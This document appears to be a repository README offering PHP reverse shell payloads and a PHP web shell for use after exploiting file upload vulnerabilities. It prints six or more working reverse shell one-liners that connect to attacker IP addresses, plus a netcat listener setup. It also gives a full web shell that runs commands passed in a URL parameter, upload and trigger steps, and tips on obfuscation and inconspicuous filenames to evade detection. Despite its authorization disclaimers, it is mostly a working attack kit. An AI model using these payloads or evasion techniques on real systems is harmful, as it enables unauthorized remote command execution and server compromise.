# Documentation: Reverse Shell Payloads and Web Shell

## Overview

This repository contains a collection of PHP reverse shell payloads and a simple PHP web shell. These are intended for use in penetration testing scenarios, particularly when a file upload vulnerability allows an attacker to execute arbitrary PHP code on a target server.

**⚠️ WARNING:**  
These scripts are for educational and authorized penetration testing purposes only. Unauthorized use is illegal and unethical. Always ensure you have proper authorization before using these tools.

---

## Table of Contents

1. [PHP Reverse Shell Payloads](#1-php-reverse-shell-payloads)
2. [PHP Web Shell](#2-php-web-shell)
3. [Usage Examples](#3-usage-examples)
4. [Security Considerations](#4-security-considerations)
5. [Troubleshooting](#5-troubleshooting)

---

## 1. PHP Reverse Shell Payloads

### Description
These one-liner payloads are designed to be executed on a compromised server to establish a reverse shell connection back to the attacker's machine. They utilize PHP's socket functions to create a connection and redirect shell I/O through the socket.

### Prerequisites
- A listener running on the attacker's machine
- Ability to execute PHP code on the target server
- Network connectivity between target and attacker

### Setup Instructions

1. **Start a listener on your attacking machine:**
   ```bash
   nc -lvnp 8080
   ```
   Replace `8080` with the port you specify in the payload.

2. **Inject or upload the PHP payload to the target server.**  
   You may use a file upload vulnerability or any other method that allows you to execute PHP code on the server.

3. **Trigger the payload.**  
   When the payload is executed, it will connect back to your listener, giving you a shell on the target server.

### Available Payloads

#### Payload 1: Using `passthru()`
```php
php -r '$sock=fsockopen("10.10.14.150",8080);passthru("sh <&3 >&3 2>&3");'
```
**Function:** `passthru()`  
**Description:** Executes a command and passes the raw output directly to the output buffer.

#### Payload 2: Using `exec()`
```php
php -r '$sock=fsockopen("10.10.14.150",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```
**Function:** `exec()`  
**Description:** Executes a command and returns the last line of output.

#### Payload 3: Using `shell_exec()`
```php
php -r '$sock=fsockopen("10.10.14.150",8080);shell_exec("sh <&3 >&3 2>&3");'
```
**Function:** `shell_exec()`  
**Description:** Executes a command via shell and returns the complete output as a string.

#### Payload 4: Using Backticks
```php
php -r '$sock=fsockopen("10.10.14.150",8080);`sh <&3 >&3 2>&3`;'
```
**Function:** Backtick operator  
**Description:** Executes a command and returns the output as a string (same as `shell_exec()`).

#### Payload 5: Using `proc_open()`
```php
php -r '$sock=fsockopen("10.10.14.150",8080);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```
**Function:** `proc_open()`  
**Description:** Executes a command and opens file pointers for input/output.

#### Payload 6: Using `system()`
```php
php -r '$sock=fsockopen("10.10.14.150",8080);system("sh <&3 >&3 2>&3");'
```
**Function:** `system()`  
**Description:** Executes a command and outputs the result.

### How Reverse Shells Work

1. **Socket Creation:** `fsockopen()` establishes a TCP connection to the attacker's machine
2. **Shell Execution:** A shell (`sh`) is executed on the target server
3. **I/O Redirection:** The shell's input, output, and error streams are redirected to the socket
4. **Remote Access:** The attacker can now send commands through the socket and receive responses

### Configuration Parameters

| Parameter | Description | Example |
|-----------|-------------|---------|
| IP Address | Attacker's IP address | `10.10.14.150` |
| Port | Listener port | `8080` |
| Shell | Shell to execute | `sh`, `/bin/sh`, `/bin/bash` |

---

## 2. PHP Web Shell

### Description
A simple PHP web shell that provides a web interface to execute commands on the server. This allows for command execution through a web browser interface.

### Features
- Web-based command execution interface
- Auto-focus on command input field
- Real-time command output display
- Simple and lightweight

### Complete Web Shell Code

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

### Usage Instructions

1. **Upload the PHP code to the target server**
   - Save the code as a `.php` file (e.g., `shell.php`)
   - Upload via file upload vulnerability or other means

2. **Access the uploaded file in your browser**
   - Navigate to `http://target-server.com/shell.php`

3. **Execute commands**
   - Enter commands in the text field
   - Click "Execute" to run the command
   - View output in the pre-formatted area below

### Web Shell Components

#### HTML Form
```html
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
```
- Uses GET method for simplicity
- Command input field with ID `cmd`
- Execute button to submit the command

#### PHP Processing
```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```
- Checks if `cmd` parameter exists in GET request
- Executes the command using `system()` function
- Outputs results directly to the page

#### JavaScript Enhancement
```javascript
<script>document.getElementById("cmd").focus();</script>
```
- Automatically focuses the command input field
- Improves user experience

---

## 3. Usage Examples

### Reverse Shell Examples

#### Basic Reverse Shell
```bash
# On attacker machine
nc -lvnp 8080

# On target server (via PHP execution)
php -r '$sock=fsockopen("192.168.1.100",8080);passthru("sh <&3 >&3 2>&3");'
```

#### Alternative Shell Commands
```php
# Using bash instead of sh
php -r '$sock=fsockopen("192.168.1.100",8080);passthru("/bin/bash <&3 >&3 2>&3");'

# Using specific shell with interactive mode
php -r '$sock=fsockopen("192.168.1.100",8080);passthru("/bin/bash -i <&3 >&3 2>&3");'
```

### Web Shell Examples

#### Basic Command Execution
```
Command: whoami
Output: www-data

Command: pwd
Output: /var/www/html

Command: ls -la
Output: total 8
drwxr-xr-x 2 www-data www-data 4096 Jan 1 12:00 .
drwxr-xr-x 3 root     root     4096 Jan 1 12:00 ..
-rw-r--r-- 1 www-data www-data  123 Jan 1 12:00 shell.php
```

#### System Information Commands
```
Command: uname -a
Output: Linux server 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux

Command: cat /etc/passwd
Output: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

Command: ps aux
Output: USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  22540  1000 ?        Ss   Jan01   0:01 /sbin/init
...
```

---

## 4. Security Considerations

### Detection Methods
- **Reverse Shells:** Network monitoring, IDS/IPS systems, firewall logs
- **Web Shells:** File integrity monitoring, web application firewalls, antivirus software

### Obfuscation Techniques
- **Code Obfuscation:** Use base64 encoding, string concatenation, or variable substitution
- **File Naming:** Use inconspicuous filenames that blend with legitimate files
- **Timing:** Implement delays or random intervals between connections

### Best Practices for Testing
1. **Authorization:** Always obtain written permission before testing
2. **Isolation:** Use isolated test environments
3. **Documentation:** Keep detailed logs of all activities
4. **Cleanup:** Remove all test files and connections after testing
5. **Reporting:** Document findings and remediation steps

---

## 5. Troubleshooting

### Common Issues

#### Reverse Shell Not Connecting
**Problem:** Listener shows no connection attempts
**Solutions:**
- Verify IP address and port are correct
- Check firewall settings on both machines
- Ensure the payload is actually executed on the target
- Try different payload variations

#### Web Shell Not Working
**Problem:** Commands execute but no output appears
**Solutions:**
- Check if `system()` function is available
- Verify file permissions on the uploaded file
- Check web server error logs
- Try alternative execution functions (`exec()`, `shell_exec()`)

#### Permission Denied Errors
**Problem:** Commands fail with permission errors
**Solutions:**
- Check user permissions on the target system
- Try commands that don't require elevated privileges
- Use `whoami` to identify current user context

### Debugging Commands

#### Network Connectivity
```bash
# Test basic connectivity
ping 192.168.1.100

# Test port connectivity
telnet 192.168.1.100 8080

# Check listening ports
netstat -tulpn | grep 8080
```

#### PHP Function Availability
```php
<?php
// Check if functions are available
echo "system(): " . (function_exists('system') ? 'Available' : 'Not Available') . "\n";
echo "exec(): " . (function_exists('exec') ? 'Available' : 'Not Available') . "\n";
echo "shell_exec(): " . (function_exists('shell_exec') ? 'Available' : 'Not Available') . "\n";
echo "passthru(): " . (function_exists('passthru') ? 'Available' : 'Not Available') . "\n";
?>
```

---

## Legal and Ethical Notice

This documentation and the associated code are provided for educational purposes only. Users are responsible for ensuring they have proper authorization before using these tools. The authors are not responsible for any misuse of this information.

**Remember:** Always follow responsible disclosure practices and respect the privacy and security of systems you do not own or have explicit permission to test.

---

## Version Information

- **Repository:** Reverse Shell Payloads Collection
- **Last Updated:** [Current Date]
- **Language:** PHP
- **Purpose:** Penetration Testing and Security Research

For questions or issues, please refer to the repository's issue tracker or contact the maintainers through appropriate channels.